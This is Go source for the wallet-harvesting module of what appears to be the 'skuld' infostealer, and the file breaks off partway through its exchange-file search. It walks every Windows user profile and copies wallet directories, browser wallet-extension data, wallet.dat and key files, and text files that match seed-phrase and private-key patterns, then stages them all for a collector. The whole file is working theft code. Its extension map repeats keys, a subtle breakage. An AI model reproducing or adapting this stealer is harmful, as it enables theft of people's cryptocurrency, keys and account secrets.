package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"regexp"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

// Run executes all wallet collection methods
func Run(dataCollector *collector.DataCollector) {
	// Create base directory for all wallet data
	baseDir := filepath.Join(os.TempDir(), "skuld-wallets")
	os.MkdirAll(baseDir, os.ModePerm)

	LocalWallets(dataCollector, baseDir)
	WalletExtensions(dataCollector, baseDir)
	WalletDatFiles(dataCollector, baseDir)
	CryptoFiles(dataCollector, baseDir)
	ExchangeFiles(dataCollector, baseDir)
}

// LocalWallets - Comprehensive local wallet detection
func LocalWallets(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "local-wallets")
	os.MkdirAll(tempDir, os.ModePerm)

	// Comprehensive wallet paths - extended search locations
	walletPaths := map[string][]string{
		"Bitcoin": {
			"AppData\\Roaming\\Bitcoin",
			"AppData\\Local\\Bitcoin",
			"Desktop\\Bitcoin",
			"Documents\\Bitcoin",
			"Downloads\\Bitcoin",
			"Pictures\\Bitcoin",
			"Videos\\Bitcoin",
			"Music\\Bitcoin",
		},
		"Ethereum": {
			"AppData\\Roaming\\Ethereum",
			"AppData\\Local\\Ethereum",
			"Desktop\\Ethereum",
			"Documents\\Ethereum",
			"Downloads\\Ethereum",
			"Pictures\\Ethereum",
			"Videos\\Ethereum",
			"Music\\Ethereum",
		},
		"Exodus": {
			"AppData\\Roaming\\Exodus",
			"Desktop\\Exodus",
			"Documents\\Exodus",
			"Downloads\\Exodus",
			"Pictures\\Exodus",
			"Videos\\Exodus",
			"Music\\Exodus",
		},
		"Atomic": {
			"AppData\\Roaming\\atomic",
			"Desktop\\atomic",
			"Documents\\atomic",
			"Downloads\\atomic",
			"Pictures\\atomic",
			"Videos\\atomic",
			"Music\\atomic",
		},
		"Electrum": {
			"AppData\\Roaming\\Electrum",
			"Desktop\\Electrum",
			"Documents\\Electrum",
			"Downloads\\Electrum",
			"Pictures\\Electrum",
			"Videos\\Electrum",
			"Music\\Electrum",
		},
		"ElectrumLTC": {
			"AppData\\Roaming\\Electrum-LTC",
			"Desktop\\Electrum-LTC",
			"Documents\\Electrum-LTC",
			"Downloads\\Electrum-LTC",
			"Pictures\\Electrum-LTC",
			"Videos\\Electrum-LTC",
			"Music\\Electrum-LTC",
		},
		"Electroneum": {
			"AppData\\Roaming\\Electroneum",
			"Desktop\\Electroneum",
			"Documents\\Electroneum",
			"Downloads\\Electroneum",
			"Pictures\\Electroneum",
			"Videos\\Electroneum",
			"Music\\Electroneum",
		},
		"Monero": {
			"AppData\\Roaming\\Monero",
			"AppData\\Roaming\\bitmonero",
			"Desktop\\Monero",
			"Documents\\Monero",
			"Downloads\\Monero",
			"Pictures\\Monero",
			"Videos\\Monero",
			"Music\\Monero",
		},
		"Litecoin": {
			"AppData\\Roaming\\Litecoin",
			"Desktop\\Litecoin",
			"Documents\\Litecoin",
			"Downloads\\Litecoin",
			"Pictures\\Litecoin",
			"Videos\\Litecoin",
			"Music\\Litecoin",
		},
		"Dogecoin": {
			"AppData\\Roaming\\DogeCoin",
			"Desktop\\DogeCoin",
			"Documents\\DogeCoin",
			"Downloads\\DogeCoin",
			"Pictures\\DogeCoin",
			"Videos\\DogeCoin",
			"Music\\DogeCoin",
		},
		"Dash": {
			"AppData\\Roaming\\DashCore",
			"Desktop\\DashCore",
			"Documents\\DashCore",
			"Downloads\\DashCore",
			"Pictures\\DashCore",
			"Videos\\DashCore",
			"Music\\DashCore",
		},
		"Zcash": {
			"AppData\\Roaming\\Zcash",
			"Desktop\\Zcash",
			"Documents\\Zcash",
			"Downloads\\Zcash",
			"Pictures\\Zcash",
			"Videos\\Zcash",
			"Music\\Zcash",
		},
		"Jaxx": {
			"AppData\\Roaming\\com.liberty.jaxx",
			"Desktop\\Jaxx",
			"Documents\\Jaxx",
			"Downloads\\Jaxx",
			"Pictures\\Jaxx",
			"Videos\\Jaxx",
			"Music\\Jaxx",
		},
		"Coinomi": {
			"AppData\\Local\\Coinomi\\Coinomi\\wallets",
			"Desktop\\Coinomi",
			"Documents\\Coinomi",
			"Downloads\\Coinomi",
			"Pictures\\Coinomi",
			"Videos\\Coinomi",
			"Music\\Coinomi",
		},
		"Guarda": {
			"AppData\\Roaming\\Guarda",
			"Desktop\\Guarda",
			"Documents\\Guarda",
			"Downloads\\Guarda",
			"Pictures\\Guarda",
			"Videos\\Guarda",
			"Music\\Guarda",
		},
		"WalletWasabi": {
			"AppData\\Roaming\\WalletWasabi",
			"Desktop\\WalletWasabi",
			"Documents\\WalletWasabi",
			"Downloads\\WalletWasabi",
			"Pictures\\WalletWasabi",
			"Videos\\WalletWasabi",
			"Music\\WalletWasabi",
		},
		"Armory": {
			"AppData\\Roaming\\Armory",
			"Desktop\\Armory",
			"Documents\\Armory",
			"Downloads\\Armory",
			"Pictures\\Armory",
			"Videos\\Armory",
			"Music\\Armory",
		},
		"ByteCoin": {
			"AppData\\Roaming\\bytecoin",
			"Desktop\\bytecoin",
			"Documents\\bytecoin",
			"Downloads\\bytecoin",
			"Pictures\\bytecoin",
			"Videos\\bytecoin",
			"Music\\bytecoin",
		},
		"Binance": {
			"AppData\\Roaming\\Binance",
			"Desktop\\Binance",
			"Documents\\Binance",
			"Downloads\\Binance",
			"Pictures\\Binance",
			"Videos\\Binance",
			"Music\\Binance",
		},
		"TrustWallet": {
			"AppData\\Roaming\\TrustWallet",
			"Desktop\\TrustWallet",
			"Documents\\TrustWallet",
			"Downloads\\TrustWallet",
			"Pictures\\TrustWallet",
			"Videos\\TrustWallet",
			"Music\\TrustWallet",
		},
		"Phantom": {
			"AppData\\Roaming\\Phantom",
			"Desktop\\Phantom",
			"Documents\\Phantom",
			"Downloads\\Phantom",
			"Pictures\\Phantom",
			"Videos\\Phantom",
			"Music\\Phantom",
		},
		"Solflare": {
			"AppData\\Roaming\\Solflare",
			"Desktop\\Solflare",
			"Documents\\Solflare",
			"Downloads\\Solflare",
			"Pictures\\Solflare",
			"Videos\\Solflare",
			"Music\\Solflare",
		},
		"Metamask": {
			"AppData\\Local\\Metamask",
			"Desktop\\Metamask",
			"Documents\\Metamask",
			"Downloads\\Metamask",
			"Pictures\\Metamask",
			"Videos\\Metamask",
			"Music\\Metamask",
		},
		"Ronin": {
			"AppData\\Local\\Ronin",
			"Desktop\\Ronin",
			"Documents\\Ronin",
			"Downloads\\Ronin",
			"Pictures\\Ronin",
			"Videos\\Ronin",
			"Music\\Ronin",
		},
		"Yoroi": {
			"AppData\\Local\\Yoroi",
			"Desktop\\Yoroi",
			"Documents\\Yoroi",
			"Downloads\\Yoroi",
			"Pictures\\Yoroi",
			"Videos\\Yoroi",
			"Music\\Yoroi",
		},
		"Daedalus": {
			"AppData\\Local\\Daedalus",
			"Desktop\\Daedalus",
			"Documents\\Daedalus",
			"Downloads\\Daedalus",
			"Pictures\\Daedalus",
			"Videos\\Daedalus",
			"Music\\Daedalus",
		},
		"Klever": {
			"AppData\\Local\\Klever",
			"Desktop\\Klever",
			"Documents\\Klever",
			"Downloads\\Klever",
			"Pictures\\Klever",
			"Videos\\Klever",
			"Music\\Klever",
		},
		"Keplr": {
			"AppData\\Local\\Keplr",
			"Desktop\\Keplr",
			"Documents\\Keplr",
			"Downloads\\Keplr",
			"Pictures\\Keplr",
			"Videos\\Keplr",
			"Music\\Keplr",
		},
		"Terra": {
			"AppData\\Local\\TerraStation",
			"Desktop\\TerraStation",
			"Documents\\TerraStation",
			"Downloads\\TerraStation",
			"Pictures\\TerraStation",
			"Videos\\TerraStation",
			"Music\\TerraStation",
		},
		"Avalanche": {
			"AppData\\Local\\Avalanche",
			"Desktop\\Avalanche",
			"Documents\\Avalanche",
			"Downloads\\Avalanche",
			"Pictures\\Avalanche",
			"Videos\\Avalanche",
			"Music\\Avalanche",
		},
		"Polygon": {
			"AppData\\Local\\Polygon",
			"Desktop\\Polygon",
			"Documents\\Polygon",
			"Downloads\\Polygon",
			"Pictures\\Polygon",
			"Videos\\Polygon",
			"Music\\Polygon",
		},
		"Harmony": {
			"AppData\\Local\\Harmony",
			"Desktop\\Harmony",
			"Documents\\Harmony",
			"Downloads\\Harmony",
			"Pictures\\Harmony",
			"Videos\\Harmony",
			"Music\\Harmony",
		},
		"Near": {
			"AppData\\Local\\Near",
			"Desktop\\Near",
			"Documents\\Near",
			"Downloads\\Near",
			"Pictures\\Near",
			"Videos\\Near",
			"Music\\Near",
		},
		"Algorand": {
			"AppData\\Local\\Algorand",
			"Desktop\\Algorand",
			"Documents\\Algorand",
			"Downloads\\Algorand",
			"Pictures\\Algorand",
			"Videos\\Algorand",
			"Music\\Algorand",
		},
		"Tezos": {
			"AppData\\Local\\Tezos",
			"Desktop\\Tezos",
			"Documents\\Tezos",
			"Downloads\\Tezos",
			"Pictures\\Tezos",
			"Videos\\Tezos",
			"Music\\Tezos",
		},
		"Cosmos": {
			"AppData\\Local\\Cosmos",
			"Desktop\\Cosmos",
			"Documents\\Cosmos",
			"Downloads\\Cosmos",
			"Pictures\\Cosmos",
			"Videos\\Cosmos",
			"Music\\Cosmos",
		},
		"Polkadot": {
			"AppData\\Local\\Polkadot",
			"Desktop\\Polkadot",
			"Documents\\Polkadot",
			"Downloads\\Polkadot",
			"Pictures\\Polkadot",
			"Videos\\Polkadot",
			"Music\\Polkadot",
		},
		"Chainlink": {
			"AppData\\Local\\Chainlink",
			"Desktop\\Chainlink",
			"Documents\\Chainlink",
			"Downloads\\Chainlink",
			"Pictures\\Chainlink",
			"Videos\\Chainlink",
			"Music\\Chainlink",
		},
	}

	found := 0
	totalSize := int64(0)
	foundWallets := make(map[string]bool) // Track found wallets to avoid duplicates

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for walletName, paths := range walletPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) {
					continue
				}

				// Create unique identifier to avoid duplicates
				walletKey := fmt.Sprintf("%s_%s_%s", userName, walletName, path)
				if foundWallets[walletKey] {
					continue
				}
				foundWallets[walletKey] = true

				destPath := filepath.Join(tempDir, userName, walletName, filepath.Base(path))
				os.MkdirAll(destPath, os.ModePerm)

				// Copy ENTIRE wallet directory with ALL contents
				if err := fileutil.CopyDir(fullPath, destPath); err == nil {
					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		localWalletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalSizeMB":       totalSize / (1024 * 1024),
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", localWalletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets")
	}
}

// WalletExtensions - Comprehensive browser extension detection
func WalletExtensions(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "wallet-extensions")
	os.MkdirAll(tempDir, os.ModePerm)

	// Comprehensive wallet extensions - complete list without duplicates
	extensions := map[string]string{
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
		"fhbohimaelbohpjbbldcngcnapndodjp": "Binance_Chain_Wallet",
		"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase_Wallet",
		"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
		"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin_Wallet",
		"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
		"flpiciilemghbmfalicajoolhkkenfel": "ICONex",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp_Wallet",
		"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEW_CX",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "Ton_Crystal_Wallet",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX_Wallet",
		"jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos_Smart_Wallet",
		"opcgpfmipidbgpenhmajoajpbobppdil": "Sui_Wallet",
		"aeachknmefphepccionboohckonoeemg": "Coin98_Wallet",
		"cgeeodpfagjceefieflmdfphplkenlfk": "EVER_Wallet",
		"pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain_Wallet",
		"bcopgchhojmggmffilplmbdicgaihlkp": "Petra_Aptos_Wallet",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Station_Wallet",
		"fijngjgcjhjmmpcmkeiomlglpeiijkld": "Tezos_Temple",
		"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple",
		"mnfifefkajgofkcjkemidiaecocnkjeh": "TezBox",
		"gjagmgiddbbciopjhllkdnddhcglnemk": "Galleon",
		"fhmfendgdocmcbmfikdcogofphimnkno": "Solflare",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet",
		"phkbamefinggmakgklpkljjmgibohnba": "Pontem_Aptos_Wallet",
		"nknhiehlklippafakaeklbeglecifhad": "Petra",
		"mcbigmjiafegjnnogedioegffbooigli": "Liquality_Wallet",
		"kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation_Wallet",
		"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
		"dngmlblcodfobpdpecaadgfbcggfjfnm": "Eternl",
		"jnmbobjmhlngoefaiojfljckilhhlhcj": "Yoroi",
		"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi_Wallet",
		"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
		"blnieiiffboillknjnepogjhkgnoapac": "XDEFI_Wallet",
		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
		"fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
		"kmendfapggjehodndflmmgagdbamhnfd": "Exodus",
		"cphhlgmgameodnhkjdmkpanlelnlohao": "NeoLine",
		"dkdedlpgdmmkkfjabffeganieamfklkm": "Cyano_Wallet",
		"nlgbhdfgdhgbiamfdfmbikcdghidoadd": "Bitpie",
		"infeboajgfhgbjpjbeppbkgnabfdkdaf": "Wax_Cloud_Wallet",
		"oeljdldpnmdbchonielidgobddfffla": "Anchor_Wallet",
		"cnmamaachppnkjgnildpdmkaakejnhae": "Scatter",
		"agoakfejjabomempkjlepdflaleeobhb": "Core",
		"heefohaffomkkkphnlpohglngmbcclhi": "Slope_Wallet",
		"cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx_Liberty",
		"ejjladinnckdgjemekebdpeokbikhfci": "Petra_Wallet",
		"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
		"jbdaocneiiinmjbjlgalhcelgbejmnid": "TronLink_Pro",
		"afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math_Wallet",
		"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
		"fnnegphlobjdpkhecapkijjdkgcjhkib": "Harmony",
		"nanjmdknhkinifnkgdcggcfnhdaammmj": "GuildWallet",
		"cjmkndjhnagcfbpiemnkdpomccnjblmj": "Safepal",
		"lpilbniiabackdjcionkobglmddfbcjo": "GeroWallet",
		"dkdedlpgdmmkkfjabffeganieamfklkm": "O3",
		"nlgbhdfgdhgbiamfdfmbikcdghidoadd": "Bitpie",
		"odbfpeeihdkbihmopkbjmoonfanlbfcl": "Brave_Wallet",
		"hcflpincpppdclinealmandijcmnkbgn": "Crypto_com",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp",
		"klnaejjgbibmhlephnhpmaofohgkpgkd": "Bitski",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Terra_Station",
		"fijngjgcjhjmmpcmkeiomlglpeiijkld": "Temple",
		"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple_Wallet",
		"mnfifefkajgofkcjkemidiaecocnkjeh": "TezBox",
		"gjagmgiddbbciopjhllkdnddhcglnemk": "Galleon",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet",
		"phkbamefinggmakgklpkljjmgibohnba": "Pontem",
		"mcbigmjiafegjnnogedioegffbooigli": "Liquality",
		"kpfopkelmapcoipemfendmdcghnegimn": "Saturn",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation_Extension",
		"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami_Wallet",
		"dngmlblcodfobpdpecaadgfbcggfjfnm": "Eternl_Wallet",
		"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi_Extension",
		"blnieiiffboillknjnepogjhkgnoapac": "XDEFI",
		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI_Extension",
		"fhilaheimglignddkjgofkcbgekhenbh": "Oxygen_Wallet",
		"cphhlgmgameodnhkjdmkpanlelnlohao": "NeoLine_Wallet",
		"infeboajgfhgbjpjbeppbkgnabfdkdaf": "Wax_Cloud",
		"oeljdldpnmdbchonielidgobddfffla": "Anchor",
		"cnmamaachppnkjgnildpdmkaakejnhae": "Scatter_Wallet",
		"agoakfejjabomempkjlepdflaleeobhb": "Core_Wallet",
		"heefohaffomkkkphnlpohglngmbcclhi": "Slope",
		"cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx",
		"ejjladinnckdgjemekebdpeokbikhfci": "Petra_Extension",
	}

	found := 0
	totalSize := int64(0)
	foundExtensions := make(map[string]bool) // Track found extensions to avoid duplicates

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		// Check all browser profiles for Local Extension Settings
		browserPaths := []string{
			"AppData\\Local\\Google\\Chrome\\User Data",
			"AppData\\Local\\Microsoft\\Edge\\User Data",
			"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
			"AppData\\Local\\Vivaldi\\User Data",
			"AppData\\Local\\Yandex\\YandexBrowser\\User Data",
			"AppData\\Local\\Opera Software\\Opera Stable",
			"AppData\\Local\\Opera Software\\Opera GX Stable",
		}

		for _, browserPath := range browserPaths {
			fullBrowserPath := filepath.Join(user, browserPath)
			if !fileutil.IsDir(fullBrowserPath) {
				continue
			}

			// Find all profiles
			profiles, err := os.ReadDir(fullBrowserPath)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				// Check Local Extension Settings folder
				extensionSettingsPath := filepath.Join(fullBrowserPath, profile.Name(), "Local Extension Settings")
				
				if !fileutil.IsDir(extensionSettingsPath) {
					continue
				}

				// Check each extension ID
				for extensionID, walletName := range extensions {
					extensionPath := filepath.Join(extensionSettingsPath, extensionID)
					
					if !fileutil.IsDir(extensionPath) {
						continue
					}

					// Create unique identifier to avoid duplicates
					extKey := fmt.Sprintf("%s_%s_%s_%s", userName, walletName, extensionID, profile.Name())
					if foundExtensions[extKey] {
						continue
					}
					foundExtensions[extKey] = true

					// Copy ENTIRE extension folder with ALL contents
					browserName := strings.Replace(browserPath, "\\", "_", -1)
					destPath := filepath.Join(tempDir, userName, browserName, profile.Name(), walletName+"_"+extensionID)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyDir(extensionPath, destPath); err == nil {
						if size, err := fileutil.GetDirectorySize(destPath); err == nil {
							totalSize += size
							found++
						}
					}
				}
			}
		}
	}

	if found > 0 {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalSizeMB":           totalSize / (1024 * 1024),
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions")
	}
}

// WalletDatFiles - Search for wallet.dat files everywhere
func WalletDatFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "wallet-dat")
	os.MkdirAll(tempDir, os.ModePerm)

	// Extended search locations
	searchPaths := []string{
		"AppData\\Roaming\\Bitcoin",
		"AppData\\Roaming\\Bitcoin\\wallets",
		"AppData\\Local\\Bitcoin",
		"AppData\\Local\\Bitcoin\\wallets",
		"AppData\\Roaming\\Litecoin",
		"AppData\\Roaming\\DogeCoin",
		"AppData\\Roaming\\DashCore",
		"AppData\\Roaming\\Zcash",
		"AppData\\Roaming\\Electrum\\wallets",
		"AppData\\Roaming\\Electrum-LTC\\wallets",
		"AppData\\Roaming\\Exodus\\exodus.wallet",
		"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
		"AppData\\Roaming",
		"AppData\\Local",
		"Desktop",
		"Documents",
		"Downloads",
		"Pictures",
		"Videos",
		"Music",
	}

	found := 0
	totalSize := int64(0)
	foundFiles := make(map[string]bool) // Track found files to avoid duplicates

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for _, searchPath := range searchPaths {
			fullPath := filepath.Join(user, searchPath)
			
			if !fileutil.IsDir(fullPath) {
				continue
			}

			// Search for wallet files recursively
			filepath.Walk(fullPath, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip very large files (>100MB)
				if info.Size() > 100*1024*1024 {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Look for wallet files with extended patterns
				isWalletFile := strings.Contains(fileName, "wallet.dat") ||
					strings.Contains(fileName, "wallet") ||
					strings.HasSuffix(fileName, ".dat") ||
					strings.Contains(fileName, "keystore") ||
					strings.Contains(fileName, "seed") ||
					strings.Contains(fileName, "mnemonic") ||
					strings.Contains(fileName, "private") ||
					strings.Contains(fileName, "key") ||
					strings.Contains(fileName, "backup") ||
					strings.Contains(fileName, "recovery") ||
					strings.HasSuffix(fileName, ".wallet") ||
					strings.HasSuffix(fileName, ".key") ||
					strings.HasSuffix(fileName, ".pem") ||
					strings.HasSuffix(fileName, ".p12") ||
					strings.HasSuffix(fileName, ".keystore")

				if !isWalletFile {
					return nil
				}

				// Create unique identifier to avoid duplicates
				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}
				foundFiles[fileKey] = true
				
				relPath, _ := filepath.Rel(user, path)
				destPath := filepath.Join(tempDir, userName, "WalletDat", relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

				if err := fileutil.CopyFile(path, destPath); err == nil {
					totalSize += info.Size()
					found++
				}

				return nil
			})
		}
	}

	if found > 0 {
		walletDatInfo := map[string]interface{}{
			"WalletDatFound": found,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_dat", walletDatInfo)
		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat")
	}
}

// CryptoFiles - Advanced crypto detection in text files
func CryptoFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "crypto-files")
	os.MkdirAll(tempDir, os.ModePerm)

	// Enhanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_c": regexp.MustCompile(`c[1-9A-HJ-NP-Za-km-z]{51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
		"polygon_address":       regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"avalanche_address":     regexp.MustCompile(`X-avax1[a-z0-9]{38}`),
		"cosmos_address":        regexp.MustCompile(`cosmos1[a-z0-9]{38}`),
		"polkadot_address":      regexp.MustCompile(`1[a-zA-Z0-9]{47}`),
		"chainlink_address":     regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"uniswap_address":       regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)
	foundFiles := make(map[string]bool) // Track found files to avoid duplicates

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		searchDirs := []string{
			filepath.Join(user, "AppData\\Roaming"),
			filepath.Join(user, "AppData\\Local"),
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip very large files (>10MB)
				if info.Size() > 10*1024*1024 {
					return nil
				}

				// Check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile {
					return nil
				}

				// Create unique identifier to avoid duplicates
				fileKey := fmt.Sprintf("%s_%s_%d", path, userName, info.Size())
				if foundFiles[fileKey] {
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						// Store actual matches
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					foundFiles[fileKey] = true
					
					relPath, _ := filepath.Rel(user, path)
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", relPath)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	// Create analysis file even if no files found
	analysisPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
	analysisContent := "🔍 CRYPTO FILES ANALYSIS\n========================\n\n"
	analysisContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
	
	if found > 0 {
		for fileName, matches := range suspiciousFiles {
			analysisContent += fmt.Sprintf("📄 File: %s\n", fileName)
			analysisContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			analysisContent += "---\n\n"
		}
		
		if len(cryptoData) > 0 {
			analysisContent += "\n💰 FOUND CRYPTO DATA\n===================\n\n"
			for key, value := range cryptoData {
				analysisContent += fmt.Sprintf("%s: %s\n", key, value)
			}
		}
	} else {
		analysisContent += "No crypto files detected in scanned directories.\n"
	}
	
	fileutil.WriteFile(analysisPath, analysisContent)

	cryptoFilesInfo := map[string]interface{}{
		"CryptoFilesFound": found,
		"SuspiciousFiles":  suspiciousFiles,
		"CryptoDataFound":  cryptoData,
		"TreeView":         fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("crypto_files", cryptoFilesInfo)
	dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files")
}

// ExchangeFiles - Search for exchange-related files
func ExchangeFiles(dataCollector *collector.DataCollector, baseDir string) {
	tempDir := filepath.Join(baseDir, "exchange-files")
	os.MkdirAll(tempDir, os.ModePerm)

	exchangeKeywords := []string{
		"binance", "coinbase", "kraken", "bitfinex", "huobi", "okex", "kucoin",
		"bybit", "ftx", "gate", "bittrex", "poloniex", "gemini", "bitstamp",
		"exchange", "trading", "api", "secret", "access", "token", "auth",
		"2fa", "backup", "codes", "recovery", "seed", "phrase", "mnemonic",
		"celsius", "nexo", "blockfi", "crypto", "defi", "yield", "staking",
	}

	found := 0
	totalSize := int64(0)
	foundFiles := make(map[string]bool) // Track found files to avoid duplicates

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
